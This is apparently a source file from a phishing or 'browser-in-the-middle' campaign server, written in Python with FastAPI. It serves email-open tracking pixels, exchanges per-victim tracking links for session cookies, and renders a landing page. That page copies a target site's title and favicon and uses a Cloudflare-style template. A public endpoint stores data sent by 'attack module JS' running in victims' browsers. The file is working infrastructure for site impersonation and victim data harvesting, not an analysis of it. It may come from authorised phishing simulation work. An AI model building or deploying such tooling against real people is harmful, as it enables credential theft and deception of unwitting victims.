# campaign-container/app/routes/tracking.py

import json
import logging
import asyncio
import base64
import html
import re

from fastapi import APIRouter, Header, Request, Response
from fastapi.responses import HTMLResponse, RedirectResponse

from config import settings
from core.client_ip import get_public_client_ip
from core.favicon import (
    remove_empty_favicon_placeholders,
)
from core.target_metadata import target_metadata_cache
from core.session_tokens import issue_session_token
from core.landing_access import landing_access
from core.tracking_events import (
    TrackingEvent,
    TrackingEventDispatcher,
    TrackingRateLimiter,
    is_valid_tracking_id,
)
from core.websocket_manager import ws_manager
from core.request_models import ModuleDataRequest
from db.database import get_victim_by_tracking_id, save_data_collection
from utils.landing_page import replace_variables, get_template_content


tracking_router = APIRouter()

ADMIN_API_URL = settings.ADMIN_API_URL.rstrip("/")
INTERNAL_API_KEY = settings.INTERNAL_API_KEY
CAMPAIGN_ID = settings.CAMPAIGN_ID

logger = logging.getLogger(__name__)

tracking_dispatcher = TrackingEventDispatcher(
    admin_api_url=ADMIN_API_URL,
    internal_api_key=INTERNAL_API_KEY,
    campaign_id=CAMPAIGN_ID,
    queue_size=settings.TRACKING_QUEUE_SIZE,
    worker_count=settings.TRACKING_WORKERS,
)
tracking_rate_limiter = TrackingRateLimiter(
    window_seconds=settings.TRACKING_RATE_LIMIT_WINDOW_SECONDS,
    max_per_client=settings.TRACKING_RATE_LIMIT_PER_CLIENT,
    max_global=settings.TRACKING_RATE_LIMIT_GLOBAL,
)


async def queue_tracking_event(
    endpoint: str,
    tracking_id: str,
    request: Request,
    *,
    rate_limit_checked: bool = False,
) -> bool:
    client_ip = get_public_client_ip(request)
    if (
        not rate_limit_checked
        and not await tracking_rate_limiter.allow(client_ip)
    ):
        logger.warning("Tracking event rejected by rate limit")
        return False
    return tracking_dispatcher.enqueue(
        TrackingEvent(
            endpoint=endpoint,
            tracking_id=tracking_id,
            ip_address=client_ip,
            user_agent=request.headers.get("user-agent"),
        )
    )


# ✅ Tracking Pixel (per email aperte)
@tracking_router.get("/p/{tracking_id}.png")
async def track_email_open(tracking_id: str, request: Request):
    """Tracking pixel - quando email viene aperta"""

    client_ip = get_public_client_ip(request)
    rate_allowed = await tracking_rate_limiter.allow(client_ip)
    if rate_allowed and is_valid_tracking_id(tracking_id):
        victim = await asyncio.to_thread(
            get_victim_by_tracking_id,
            tracking_id,
        )
        if victim:
            await queue_tracking_event(
                endpoint="/api/tracking/email-opened",
                tracking_id=tracking_id,
                request=request,
                rate_limit_checked=True,
            )

    # Return 1x1 transparent PNG
    pixel_data = base64.b64decode(
        b'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
    )

    return Response(
        content=pixel_data,
        media_type="image/png",
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Expires": "0",
            "Pragma": "no-cache",
        },
    )


async def exchange_tracking_link(
    entry_path: str,
    tracking_id: str,
    request: Request,
):
    """Exchange the email capability for an opaque, HttpOnly browser session."""
    if (
        entry_path != settings.ENTRY_PATH
        or not tracking_id
        or len(tracking_id) > 128
        or not is_valid_tracking_id(tracking_id)
    ):
        return HTMLResponse(
            content="<h1>Link unavailable</h1>",
            status_code=404,
            headers={"Cache-Control": "no-store"},
        )
    client_ip = get_public_client_ip(request)
    rate_allowed = await tracking_rate_limiter.allow(client_ip)
    victim = await asyncio.to_thread(get_victim_by_tracking_id, tracking_id)
    if not victim:
        return HTMLResponse(
            content="<h1>Link unavailable</h1>",
            status_code=404,
            headers={"Cache-Control": "no-store"},
        )

    if rate_allowed:
        await queue_tracking_event(
            endpoint="/api/tracking/link-clicked",
            tracking_id=tracking_id,
            request=request,
            rate_limit_checked=True,
        )
    bootstrap = await landing_access.issue(tracking_id)
    base_path = (
        f"/{settings.CAMPAIGN_ID}"
        if settings.ENVIRONMENT != "production"
        else ""
    )
    landing_path = (
        f"{base_path}/{settings.ENTRY_PATH}"
        if settings.ENTRY_PATH
        else f"{base_path}/"
    )
    response = RedirectResponse(url=landing_path, status_code=303)
    response.set_cookie(
        key=settings.LANDING_COOKIE_NAME,
        value=bootstrap,
        max_age=86400,
        path=landing_path,
        secure=True,
        httponly=True,
        samesite="lax",
    )
    response.headers.update(
        {
            "Cache-Control": "no-store, max-age=0",
            "Pragma": "no-cache",
            "Referrer-Policy": "no-referrer",
        }
    )
    return response


@tracking_router.get("/")
async def track_link_click(request: Request):
    """
    Render the clean landing URL after the opaque browser-session exchange.
    """
    if settings.TRACKING_PARAMETER:
        values = request.query_params.getlist(settings.TRACKING_PARAMETER)
        if len(values) == 1:
            return await exchange_tracking_link(
                settings.ENTRY_PATH,
                values[0],
                request,
            )

    tracking_id = await landing_access.resolve(
        request.cookies.get(settings.LANDING_COOKIE_NAME)
    )
    if not tracking_id:
        logger.warning("Rejected landing-page request with malformed authorization")
        return HTMLResponse(
            content="<h1>Link unavailable</h1>",
            status_code=404,
            headers={"Cache-Control": "no-store"},
        )

    if tracking_id:
        victim = await asyncio.to_thread(get_victim_by_tracking_id, tracking_id)
        if not victim:
            logger.warning("Rejected landing-page request with an invalid tracking token")
            return HTMLResponse(
                content="<h1>Link unavailable</h1>",
                status_code=404,
                headers={"Cache-Control": "no-store"},
            )

        session_token = issue_session_token(
            victim_id=victim["id"],
            campaign_id=settings.CAMPAIGN_ID,
            secret=settings.SESSION_TOKEN_SECRET,
            ttl_seconds=settings.SESSION_TOKEN_TTL_SECONDS,
        )

        metadata = await target_metadata_cache.get(settings.URL)
        page_title = metadata.title
        favicon_url = metadata.favicon

        # ✅ Load Cloudflare template
        html_content = get_template_content("landing_page.html")
        if not favicon_url:
            html_content = remove_empty_favicon_placeholders(html_content)

        html_content = replace_variables(
            text=html_content,
            victim=victim,
            target_url=settings.URL
        )
        replacements = {
            "TITLE": html.escape(page_title),
            "FAVICON": html.escape(favicon_url, quote=True),
        }
        html_content = re.sub(
            "TITLE|FAVICON",
            lambda match: replacements[match.group(0)],
            html_content,
        )

        tracking_script = f"""
            <script>
                window.BITM_SESSION_TOKEN = {json.dumps(session_token)};
            </script>
        """
        html_content = html_content.replace("</head>", f"{tracking_script}</head>")
        logger.info("Landing page issued a short-lived WebSocket session token")

        response = HTMLResponse(
            content=html_content,
            headers={
                "Cache-Control": "no-store, max-age=0",
                "Pragma": "no-cache",
                "Referrer-Policy": "no-referrer",
            },
        )
        return response


@tracking_router.get("/{requested_path:path}")
async def route_landing_request(
    requested_path: str,
    request: Request,
):
    """Route the clean target-shaped path and its initial capability."""
    requested_path = requested_path.strip("/")
    expected_path = settings.ENTRY_PATH.strip("/")

    if settings.TRACKING_PARAMETER:
        if requested_path != expected_path:
            return HTMLResponse(
                content="<h1>Link unavailable</h1>",
                status_code=404,
                headers={"Cache-Control": "no-store"},
            )
        values = request.query_params.getlist(settings.TRACKING_PARAMETER)
        if len(values) == 1:
            return await exchange_tracking_link(
                expected_path,
                values[0],
                request,
            )
        return await track_link_click(request)

    if requested_path == expected_path:
        return await track_link_click(request)

    if expected_path:
        prefix = f"{expected_path}/"
        if not requested_path.startswith(prefix):
            tracking_id = ""
        else:
            tracking_id = requested_path[len(prefix):]
    else:
        tracking_id = requested_path

    if not tracking_id or "/" in tracking_id:
        return HTMLResponse(
            content="<h1>Link unavailable</h1>",
            status_code=404,
            headers={"Cache-Control": "no-store"},
        )
    return await exchange_tracking_link(
        expected_path,
        tracking_id,
        request,
    )


# ========================================
# MODULE DATA COLLECTION (Public endpoint)
# ========================================

@tracking_router.post("/c/{victim_id}")
async def collect_module_data(
    victim_id: str,
    data: ModuleDataRequest,
    x_bitm_collection_token: str = Header(None),
):
    """
    Public endpoint for module data collection.
    Called by module JS running in victim's browser.
    URL: POST /c/{victim_id}

    Expects JSON body:
    {
        "data_type": "module_data",
        "module_id": "...",
        "metadata": { ... },
        "file_path": "..."  // optional, not needed for module_data
    }
    """
    try:
        if not ws_manager.verify_collection_token(
            victim_id,
            x_bitm_collection_token,
        ):
            return Response(status_code=404)

        save_data_collection(
            victim_id=victim_id,
            data_type=data.data_type,
            file_path=None,
            module_id=data.module_id,
            metadata=data.metadata,
        )

        logger.info(
            "Module data collected: %s from victim %s",
            data.data_type,
            victim_id,
        )

        # Return 204 No Content (minimal response, no CORS issues with simple POST)
        return Response(status_code=204)

    except Exception as e:
        logger.error(f"❌ Error collecting module data: {e}")
        # Do not mask a failed save as success: callers (attack module JS)
        # may act on the response status to decide whether the data was
        # actually collected.
        return Response(status_code=500)
